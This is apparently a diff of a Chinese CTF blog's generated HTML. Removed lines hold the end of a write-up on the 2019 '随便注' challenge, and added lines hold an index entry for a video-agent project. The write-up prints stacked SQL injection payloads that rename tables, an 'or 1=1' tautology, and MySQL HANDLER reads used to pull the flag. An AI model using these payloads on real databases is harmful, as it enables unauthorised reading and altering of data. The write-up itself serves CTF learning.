-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`<span class="number">1</span><span class="string">&#x27;; alter table words rename to words1;</span></span><br><span class="line"><span class="string">alter table `1919810931114514` rename to words;</span></span><br><span class="line"><span class="string">alter table words change flag id varchar(50);# `</span></span><br></pre></td></tr></table></figure>
-
-<p>然后通过<code>1&#39; or 1 = 1 #</code>，成功获取到flag。 </p>
-<ul>
-<li>修改表名：<code>ALTER TABLE 旧表名 RENAME TO 新表名；</code></li>
-<li>修改字段：<code>ALTER TABLE 表名 CHANGE 旧字段名 新字段名 新数据类型；</code></li>
-</ul>
-<h3 id="handle"><a href="#handle" class="headerlink" title="handle"></a>handle</h3><p>此题还可以通过handle直接出答案：<code>1&#39;;HANDLER </code>1919810931114514<code>OPEN;HANDLER</code>1919810931114514<code>READ FIRST;HANDLER</code>1919810931114514<code> CLOSE;</code></p>
-<ul>
-<li>handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据，格式：</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">打开表：</span><br><span class="line">HANDLER 表名 OPEN ;</span><br><span class="line"></span><br><span class="line">查看数据：</span><br><span class="line">HANDLER 表名 READ next;</span><br><span class="line"></span><br><span class="line">关闭表：</span><br><span class="line">HANDLER 表名 READ CLOSE;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="references"><a href="#references" class="headerlink" title="references"></a>references</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jonhswei/article/details/147323081">sql注入9之堆叠注入-CSDN博客</a></p>
-<p>[<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/545713669">强网杯 2019]随便注 1【SQL注入】四种解法 - 知乎</a></p>
-<p>[BUUCTF <a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/123292860">强网杯 2019]随便注 1（两种方法）-CSDN博客</a></p>
-
-    </article>
-    <!-- license -->
-        <div class="license-wrapper">
-            <p>原文作者：<a href="https://everythingis-ok.github.io">seora</a>
-            <p>原文链接：<a href="https://everythingis-ok.github.io/2025/10/19/%C2%96%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91/">https://everythingis-ok.github.io/2025/10/19/%C2%96%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91/</a>
-            <p>发表日期：<a href="https://everythingis-ok.github.io/2025/10/19/%C2%96%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91/">十月 19日 2025, 10:01:42 晚上</a>
-            <p>更新日期：<a href="https://everythingis-ok.github.io/2025/10/19/%C2%96%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91/">May 8th 2026, 9:11:45 pm</a>
-            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
-        </div>
-    <!-- paginator -->
-    <ul class="post-paginator">
-        <li class="next">
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2025/10/20/SUSCTF-2022-Tanner/" title="[SUSCTF 2022]Tanner">
-                    <div class="nextTitle">[SUSCTF 2022]Tanner</div>
-                </a>
-        </li>
-        <li class="previous">
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2025/10/18/php%E4%BB%A3%E7%A0%81%E4%B9%8Bcreate-function-%E5%87%BD%E6%95%B0/" title="php代码之create_function()函数">
-                    <div class="prevTitle">php代码之create_function()函数</div>
-                </a>
-        </li>
-    </ul>
-    <!-- comment -->
-        <div class="post-comment">
-            <!-- 来必力 City 版安装代码 -->
-
+                <main class="main index-page">
             
-            
-            
-            <!-- utteranc评论 -->
+        <article class="index-post">
+            <a class="abstract-title" href="/2026/10/08/DOVideo-AI%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D/">
+                <span class="abstract-title-text">DOVideo-AI · 面向长视频理解的 Video Agent</span>
+            </a>
+            <div class="abstract-content">
+                DOVideo-AI · 面向长视频内容理解的 Video Agent
+项目仓库：https://github.com/everythingis-ok/DOVideo-AI（MIT License，欢迎 Star ⭐）
 
-            <!-- partial('_partial/comment/changyan') -->
-            <!--PC版-->
+DoVideoAI 是一个面向长视频内容理解的 Video Agent，致力于把长视频转化为可检索、可追溯、可继续追问的结构化知识。
+用户登录后可以上传视频并在工作台管理解析任务；选择视频并输入分析目标后，既可以手动选择分析模式，也可以交给 Agent 自动判断。工作台会展示结构化结论、时间戳证据、执行计划、阶段轨迹与质量评估，并支持基于同一视频继续追问。
+核心能力长视...
+            </div>
+            <!-- read more -->
+            <div class="abstract-post-meta">
+                <!-- date -->
+                <div class="abstract-date" title="Last updated: 2026/10/08">
+                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2026/10/08</span>
+                </div>
+                <!-- tags -->
+                    <div class="abstract-tags" >
+        <a class="post-tag" href="javascript:void(0);" data-tags="Java">Java</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="Spring Boot">Spring Boot</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="Vue">Vue</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="LangChain4j">LangChain4j</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="Video Agent">Video Agent</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="RAG">RAG</a>
+</div>
 
-            
-            
-            
-        </div>
-    <!-- timeliness note -->
-    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
-    <!-- Mathjax -->
+            </div>
+        </article>
+        <div class="index-post-divider"></div>
+    <!-- paginator  -->
 </main>
 
                 <!-- profile -->
@@ -613,13 +1066,6 @@
 
         </div>
         <!-- toc -->
-            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
->
-                <div class="toc-catalog">
-                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-                </div>
-                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91"><span class="toc-number">1.</span> <span class="toc-text">[强网杯 2019]随便注 1【SQL注入】</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%9F%A5%E8%AF%A2"><span class="toc-number">1.0.1.</span> <span class="toc-text">SQL查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.2.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.3.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">1.0.4.</span> <span class="toc-text">预编译</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E7%BC%96%E8%AF%91%E8%AF%AD%E5%8F%A5-%E5%B0%86%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C16%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81"><span class="toc-number">1.0.5.</span> <span class="toc-text">预编译语句 将语句进行16进制编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9B%B4%E6%94%B9%E8%A1%A8%E5%90%8D"><span class="toc-number">1.0.6.</span> <span class="toc-text">更改表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#handle"><span class="toc-number">1.0.7.</span> <span class="toc-text">handle</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#references"><span class="toc-number">1.1.</span> <span class="toc-text">references</span></a></li></ol></li></ol>
-            </div>
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
     <ul class="sidebar-tabs sidebar-tabs-active-0">
@@ -673,15 +1119,20 @@
         
         
         
+        
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 43
+        Total : 44
         </div>
         <!-- search  -->
     </div>
     <div class="post-archive">
             <div class="archive-year"> 2026 </div>
             <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span>
+            <a class="archive-post-title" href="/2026/10/08/DOVideo-AI%E9%A1%B9%E7%9B%AE%E4%BB%8B%E7%BB%8D/">DOVideo-AI · 面向长视频理解的 Video Agent</a>
+        </li>
         <li class="archive-post-item">
             <span class="archive-post-date">08/05</span>
             <a class="archive-post-title" href="/2026/08/05/%E8%8B%8D%E7%A9%B9%E5%A4%96%E5%8D%96%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/">苍穹外卖项目总结</a>
@@ -692,7 +1143,7 @@
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">05/24</span>
-            <a class="archive-post-title" href="/2026/05/24/%C2%96-NSSRound-6-Team-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">[NSSRound#6 Team] 题目复现</a>
+            <a class="archive-post-title" href="/2026/05/24/NSSRound-6-Team-%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">[NSSRound#6 Team] 题目复现</a>
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">05/08</span>
@@ -703,11 +1154,11 @@
             <ul class="year-list">
         <li class="archive-post-item">
             <span class="archive-post-date">12/14</span>
-            <a class="archive-post-title" href="/2025/12/14/polarCTFweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%AE%80%E5%8D%95-02/">polarCTFweb刷题记录(简单)02</a>
+            <a class="archive-post-title" href="/2025/12/14/polarCTFweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%AE%80%E5%8D%95/">polarCTFweb刷题记录(简单)</a>
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">12/14</span>
-            <a class="archive-post-title" href="/2025/12/14/polarCTFweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%AE%80%E5%8D%95/">polarCTFweb刷题记录(简单)</a>
+            <a class="archive-post-title" href="/2025/12/14/polarCTFweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%AE%80%E5%8D%95-02/">polarCTFweb刷题记录(简单)02</a>
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">12/11</span>
@@ -743,7 +1194,7 @@
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">10/23</span>
-            <a class="archive-post-title" href="/2025/10/23/%C2%96SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%A5%87%E5%A6%99%E7%9A%84MD5/">[SWPUCTF 2022 新生赛]奇妙的MD5</a>
+            <a class="archive-post-title" href="/2025/10/23/SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-%E5%A5%87%E5%A6%99%E7%9A%84MD5/">[SWPUCTF 2022 新生赛]奇妙的MD5</a>
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">10/23</span>
@@ -763,7 +1214,7 @@
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">10/19</span>
-            <a class="archive-post-title" href="/2025/10/19/%C2%96%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91/">[强网杯 2019]随便注 1【SQL注入】</a>
+            <a class="archive-post-title" href="/2025/10/19/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8-1%E3%80%90SQL%E6%B3%A8%E5%85%A5%E3%80%91/">[强网杯 2019]随便注 1【SQL注入】</a>
         </li>
         <li class="archive-post-item">
             <span class="archive-post-date">10/18</span>
@@ -866,6 +1317,10 @@
 
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="文件上传">
+                <span class="iconfont-archer">&#xe606;</span>
+                文件上传
+            </span>
             <span class="sidebar-tag-name" data-tags="00截断">
                 <span class="iconfont-archer">&#xe606;</span>
                 00截断
@@ -873,10 +1328,6 @@
             <span class="sidebar-tag-name" data-tags="CTFhub">
                 <span class="iconfont-archer">&#xe606;</span>
                 CTFhub
-            </span>
-            <span class="sidebar-tag-name" data-tags="文件上传">
-                <span class="iconfont-archer">&#xe606;</span>
-                文件上传
             </span>
             <span class="sidebar-tag-name" data-tags="Ctfhub">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -889,6 +1340,30 @@
             <span class="sidebar-tag-name" data-tags="MIME绕过">
                 <span class="iconfont-archer">&#xe606;</span>
                 MIME绕过
+            </span>
+            <span class="sidebar-tag-name" data-tags="Java">
+                <span class="iconfont-archer">&#xe606;</span>
+                Java
+            </span>
+            <span class="sidebar-tag-name" data-tags="Spring Boot">
+                <span class="iconfont-archer">&#xe606;</span>
+                Spring Boot
+            </span>
+            <span class="sidebar-tag-name" data-tags="Vue">
+                <span class="iconfont-archer">&#xe606;</span>
+                Vue
+            </span>
+            <span class="sidebar-tag-name" data-tags="LangChain4j">
+                <span class="iconfont-archer">&#xe606;</span>
+                LangChain4j
+            </span>
+            <span class="sidebar-tag-name" data-tags="Video Agent">
+                <span class="iconfont-archer">&#xe606;</span>
+                Video Agent
+            </span>
+            <span class="sidebar-tag-name" data-tags="RAG">
+                <span class="iconfont-archer">&#xe606;</span>
+                RAG
             </span>
             <span class="sidebar-tag-name" data-tags="php代码审计">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -906,18 +1381,6 @@
                 <span class="iconfont-archer">&#xe606;</span>
                 Linux命令
             </span>
-            <span class="sidebar-tag-name" data-tags="NTFS数据隐写">
-                <span class="iconfont-archer">&#xe606;</span>
-                NTFS数据隐写
-            </span>
-            <span class="sidebar-tag-name" data-tags="python反编译">
-                <span class="iconfont-archer">&#xe606;</span>
-                python反编译
-            </span>
-            <span class="sidebar-tag-name" data-tags="RCE">
-                <span class="iconfont-archer">&#xe606;</span>
-                RCE
-            </span>
             <span class="sidebar-tag-name" data-tags="NSSCTF">
                 <span class="iconfont-archer">&#xe606;</span>
                 NSSCTF
@@ -926,13 +1389,29 @@
                 <span class="iconfont-archer">&#xe606;</span>
                 隐写
             </span>
-            <span class="sidebar-tag-name" data-tags="编码">
+            <span class="sidebar-tag-name" data-tags="RCE">
                 <span class="iconfont-archer">&#xe606;</span>
-                编码
+                RCE
+            </span>
+            <span class="sidebar-tag-name" data-tags="NTFS数据隐写">
+                <span class="iconfont-archer">&#xe606;</span>
+                NTFS数据隐写
+            </span>
+            <span class="sidebar-tag-name" data-tags="python反编译">
+                <span class="iconfont-archer">&#xe606;</span>
+                python反编译
             </span>
             <span class="sidebar-tag-name" data-tags="rce4">
                 <span class="iconfont-archer">&#xe606;</span>
                 rce4
+            </span>
+            <span class="sidebar-tag-name" data-tags="编码">
+                <span class="iconfont-archer">&#xe606;</span>
+                编码
+            </span>
+            <span class="sidebar-tag-name" data-tags="md5碰撞">
+                <span class="iconfont-archer">&#xe606;</span>
+                md5碰撞
             </span>
             <span class="sidebar-tag-name" data-tags="压缩包修复">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -946,10 +1425,6 @@
                 <span class="iconfont-archer">&#xe606;</span>
                 XXE
             </span>
-            <span class="sidebar-tag-name" data-tags="create_function()函数">
-                <span class="iconfont-archer">&#xe606;</span>
-                create_function()函数
-            </span>
             <span class="sidebar-tag-name" data-tags="php反序列化">
                 <span class="iconfont-archer">&#xe606;</span>
                 php反序列化
@@ -957,6 +1432,10 @@
             <span class="sidebar-tag-name" data-tags="pop链构造">
                 <span class="iconfont-archer">&#xe606;</span>
                 pop链构造
+            </span>
+            <span class="sidebar-tag-name" data-tags="create_function()函数">
+                <span class="iconfont-archer">&#xe606;</span>
+                create_function()函数
             </span>
             <span class="sidebar-tag-name" data-tags="SSTI">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -966,10 +1445,6 @@
                 <span class="iconfont-archer">&#xe606;</span>
                 提权
             </span>
-            <span class="sidebar-tag-name" data-tags="NewStarCTF2024">
-                <span class="iconfont-archer">&#xe606;</span>
-                NewStarCTF2024
-            </span>
             <span class="sidebar-tag-name" data-tags="polarctf">
                 <span class="iconfont-archer">&#xe606;</span>
                 polarctf
@@ -977,6 +1452,10 @@
             <span class="sidebar-tag-name" data-tags="session文件包含">
                 <span class="iconfont-archer">&#xe606;</span>
                 session文件包含
+            </span>
+            <span class="sidebar-tag-name" data-tags="NewStarCTF2024">
+                <span class="iconfont-archer">&#xe606;</span>
+                NewStarCTF2024
             </span>
             <span class="sidebar-tag-name" data-tags="编码解码">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -990,17 +1469,21 @@
                 <span class="iconfont-archer">&#xe606;</span>
                 LSB隐写
             </span>
-            <span class="sidebar-tag-name" data-tags="md5碰撞">
+            <span class="sidebar-tag-name" data-tags="SQL注入">
                 <span class="iconfont-archer">&#xe606;</span>
-                md5碰撞
+                SQL注入
+            </span>
+            <span class="sidebar-tag-name" data-tags="RCE绕过">
+                <span class="iconfont-archer">&#xe606;</span>
+                RCE绕过
+            </span>
+            <span class="sidebar-tag-name" data-tags="信息泄露">
+                <span class="iconfont-archer">&#xe606;</span>
+                信息泄露
             </span>
             <span class="sidebar-tag-name" data-tags="堆叠注入">
                 <span class="iconfont-archer">&#xe606;</span>
                 堆叠注入
-            </span>
-            <span class="sidebar-tag-name" data-tags="SQL注入">
-                <span class="iconfont-archer">&#xe606;</span>
-                SQL注入
             </span>
             <span class="sidebar-tag-name" data-tags="报错注入">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -1017,14 +1500,6 @@
             <span class="sidebar-tag-name" data-tags="handel语句">
                 <span class="iconfont-archer">&#xe606;</span>
                 handel语句
-            </span>
-            <span class="sidebar-tag-name" data-tags="RCE绕过">
-                <span class="iconfont-archer">&#xe606;</span>
-                RCE绕过
-            </span>
-            <span class="sidebar-tag-name" data-tags="信息泄露">
-                <span class="iconfont-archer">&#xe606;</span>
-                信息泄露
             </span>
             <span class="sidebar-tag-name" data-tags="文件包含">
                 <span class="iconfont-archer">&#xe606;</span>
@@ -1068,17 +1543,105 @@
 
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
-        <span class="sidebar-category-name" data-categories="web">
+        <span class="sidebar-category-name" data-categories="赛事WriteUp">
             <span class="iconfont-archer">&#xe60a;</span>
-            web
+            赛事WriteUp
+        </span>
+        <span class="sidebar-category-name" data-categories="CTF-Web">
+            <span class="iconfont-archer">&#xe60a;</span>
+            CTF-Web
+        </span>
+        <span class="sidebar-category-name" data-categories="全方向综合WP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            全方向综合WP
+        </span>
+        <span class="sidebar-category-name" data-categories="我的项目">
+            <span class="iconfont-archer">&#xe60a;</span>
+            我的项目
+        </span>
+        <span class="sidebar-category-name" data-categories="注入与RCE">
+            <span class="iconfont-archer">&#xe60a;</span>
+            注入与RCE
+        </span>
+        <span class="sidebar-category-name" data-categories="PHP杂谈">
+            <span class="iconfont-archer">&#xe60a;</span>
+            PHP杂谈
+        </span>
+        <span class="sidebar-category-name" data-categories="SSTI模板注入">
+            <span class="iconfont-archer">&#xe60a;</span>
+            SSTI模板注入
+        </span>
+        <span class="sidebar-category-name" data-categories="文件上传绕过">
+            <span class="iconfont-archer">&#xe60a;</span>
+            文件上传绕过
         </span>
         <span class="sidebar-category-name" data-categories="博客搭建">
             <span class="iconfont-archer">&#xe60a;</span>
             博客搭建
         </span>
-        <span class="sidebar-category-name" data-categories="misc">
+        <span class="sidebar-category-name" data-categories="Linux与运维">
             <span class="iconfont-archer">&#xe60a;</span>
-            misc
+            Linux与运维
+        </span>
+        <span class="sidebar-category-name" data-categories="Web综合WP">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Web综合WP
+        </span>
+        <span class="sidebar-category-name" data-categories="Misc杂项">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Misc杂项
+        </span>
+        <span class="sidebar-category-name" data-categories="Web安全">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Web安全
+        </span>
+        <span class="sidebar-category-name" data-categories="AI视频">
+            <span class="iconfont-archer">&#xe60a;</span>
+            AI视频
+        </span>
+        <span class="sidebar-category-name" data-categories="基础与环境">
+            <span class="iconfont-archer">&#xe60a;</span>
+            基础与环境
+        </span>
+        <span class="sidebar-category-name" data-categories="隐写术">
+            <span class="iconfont-archer">&#xe60a;</span>
+            隐写术
+        </span>
+        <span class="sidebar-category-name" data-categories="漏洞原理笔记">
+            <span class="iconfont-archer">&#xe60a;</span>
+            漏洞原理笔记
+        </span>
+        <span class="sidebar-category-name" data-categories="编码与古典密码">
+            <span class="iconfont-archer">&#xe60a;</span>
+            编码与古典密码
+        </span>
+        <span class="sidebar-category-name" data-categories="压缩包与办公文件">
+            <span class="iconfont-archer">&#xe60a;</span>
+            压缩包与办公文件
+        </span>
+        <span class="sidebar-category-name" data-categories="PHP与反序列化">
+            <span class="iconfont-archer">&#xe60a;</span>
+            PHP与反序列化
+        </span>
+        <span class="sidebar-category-name" data-categories="文件包含">
+            <span class="iconfont-archer">&#xe60a;</span>
+            文件包含
+        </span>
+        <span class="sidebar-category-name" data-categories="编程开发">
+            <span class="iconfont-archer">&#xe60a;</span>
+            编程开发
+        </span>
+        <span class="sidebar-category-name" data-categories="数字取证">
+            <span class="iconfont-archer">&#xe60a;</span>
+            数字取证
+        </span>
+        <span class="sidebar-category-name" data-categories="Java">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Java
+        </span>
+        <span class="sidebar-category-name" data-categories="应急响应取证">
+            <span class="iconfont-archer">&#xe60a;</span>
+            应急响应取证
         </span>
     </div>
     <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
@@ -1112,7 +1675,6 @@
         <!-- busuanzi -->
             <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
         <!-- async load share.js -->
-            <script src="/scripts/share.js" async></script>
         <!-- mermaid -->
     </body>
 </html>
